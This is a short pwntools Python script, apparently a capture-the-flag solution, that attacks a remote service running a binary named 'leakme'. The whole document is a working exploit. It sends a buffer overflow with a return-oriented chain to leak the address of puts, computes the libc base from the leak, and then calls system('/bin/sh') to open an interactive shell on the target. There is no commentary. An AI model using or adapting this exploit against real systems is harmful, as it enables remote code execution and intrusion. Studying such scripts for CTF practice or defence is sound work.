from pwn import *

p = remote("128.199.12.141", 7002)

exe = ELF("./leakme")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

puts_plt = p64(0x401030)
puts_got = p64(exe.got['puts'])

bin_sh = p64(0x402008)

rdi_ret = p64(0x4011fb)

vuln = p64(0x401142)

buf = b'A'*40

p.recv()

payload = buf + rdi_ret + puts_got + puts_plt + vuln
p.sendline(payload)

leak = p.recvline()

base = u64(leak.rstrip().ljust(8, b'\x00')) - libc.symbols['puts']

system = p64(base + libc.symbols['system'])

payload2 = buf + rdi_ret + bin_sh + system

p.sendline(payload2)

p.interactive()
